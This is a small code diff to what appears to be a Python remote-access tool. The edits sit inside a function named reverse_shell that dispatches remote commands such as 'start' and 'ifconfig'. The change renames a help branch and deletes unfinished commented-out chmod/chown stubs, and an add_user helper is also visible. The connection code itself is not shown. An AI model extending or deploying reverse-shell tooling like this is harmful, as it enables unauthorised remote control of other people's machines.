@@ -85,7 +85,7 @@ def reverse_shell():
         elif "start" == output_split[0].lower() and ("/" not in output or "/" in output):
             start_file(output_split, OS)
             continue
-        elif "help" == output_split[0].lower() or "help" in output.lower():
+        elif "help1" == output_split[0].lower() or "help1" in output.lower():
             continue
         elif "ifconfig" == output_split[0].lower() or "ifconfig" in output.lower():
             ifconfig(OS)
@@ -247,16 +247,6 @@ def add_user():
 
 
 # def chmod():
-#     a = chmo
-#     b =
-#     c =
-#     d =
-#     e =
-#     f=
-#     os.chmod()
-# def chown():
-#     # not working yet
-#     os.chown()
 #     pass
 
 
